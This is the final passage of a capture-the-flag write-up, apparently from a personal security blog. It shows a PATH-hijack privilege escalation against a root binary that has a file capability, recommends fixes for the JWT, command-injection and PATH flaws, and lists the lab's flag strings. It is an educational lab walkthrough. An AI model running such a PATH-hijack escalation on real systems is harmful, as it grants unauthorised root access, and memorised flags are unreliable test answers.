+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># attacker-controlled $PATH</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;cat /root/root.txt&#39;</span> &gt; /tmp/ph/manifest-helper
+</span></span><span class="line"><span class="cl">chmod +x /tmp/ph/manifest-helper
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">PATH</span><span class="o">=</span>/tmp/ph:<span class="nv">$PATH</span> /usr/local/bin/manifest-sign
+</span></span></code></pre></div><p>That prints the root flag. No exploit code, no memory corruption, just a root process trusting the environment it was launched in:</p>
+<p><img alt="A file capability plus a relative execlp is a root shell waiting to happen" loading="lazy" src="/public/images/pearl-harbour/04_privesc.png"></p>
+<div class="dr-callout ok">
+  <span class="t">Both flags down</span>
+  <p><code>user.txt</code> came from the injected shell. <code>root.txt</code> came from hijacking a helper that a capability-bearing binary called by relative name. Two clean bugs on the way in, one configuration mistake on the way up.</p>
+</div>
+<h2 id="what-i-would-fix">What I Would Fix<a hidden class="anchor" aria-hidden="true" href="#what-i-would-fix">#</a></h2>
+<p>None of this is exotic, which is exactly why it is worth writing down. Four changes close the box:</p>
+<div class="dr-traps">
+  <div class="dr-trap">
+    <span class="t"><span class="x">✗</span> kgid/key path from the token</span>
+    Never derive a filesystem path from a token header. Pin the key to a known, mapped `kid` value and reject anything that does not match.
+    <span class="truth">no traversal, no key swap</span>
+  </div>
+  <div class="dr-trap">
+    <span class="t"><span class="x">✗</span> algorithm chosen by the caller</span>
+    Pin the expected algorithm server side. If the service issues RS256, verify RS256 and nothing else.
+    <span class="truth">HS256 tokens stop working</span>
+  </div>
+  <div class="dr-trap">
+    <span class="t"><span class="x">✗</span> shelling out with a filename</span>
+    Pass arguments as a list to `subprocess` without `shell=True`, and validate the filename against a strict allowlist.
+    <span class="truth">semicolons become literal text</span>
+  </div>
+  <div class="dr-trap">
+    <span class="t"><span class="x">✗</span> a root helper found on PATH</span>
+    Call the helper by absolute path, or drop the capability entirely and use a narrowly scoped root service.
+    <span class="truth">the environment stops mattering</span>
+  </div>
+</div>
+<h2 id="flags">Flags<a hidden class="anchor" aria-hidden="true" href="#flags">#</a></h2>
+<div class="dr-verdict">
+  <div class="half auth">
+    <span class="big">user.txt</span><br>
+    r00t{a_t0rp3d0_n4m3d_k1d}<br>
+    <small>shell injection as dockhand</small>
+  </div>
+  <div class="half ghosts">
+    <span class="big">root.txt</span><br>
+    r00t{c4p_s3tu1d_s4nk_th3_f1l33t}<br>
+    <small>capability plus PATH hijack</small>
+  </div>
+</div>
+<p>A good reminder that a JWT is only as trustworthy as the two fields you refuse to read from it. The attack was not a cracked signature. It was the server asking the token how it should be verified. Thanks for reading.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://frankie7techy.github.io/public/tags/ctf/">CTF</a></li>
+      <li><a href="https://frankie7techy.github.io/public/tags/web-exploitation/">Web Exploitation</a></li>
+      <li><a href="https://frankie7techy.github.io/public/tags/jwt/">JWT</a></li>
+      <li><a href="https://frankie7techy.github.io/public/tags/command-injection/">Command Injection</a></li>
+      <li><a href="https://frankie7techy.github.io/public/tags/linux-privilege-escalation/">Linux Privilege Escalation</a></li>
+      <li><a href="https://frankie7techy.github.io/public/tags/boot2root/">Boot2Root</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://frankie7techy.github.io/public/">z3ro :: CTF &amp; Security Research</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
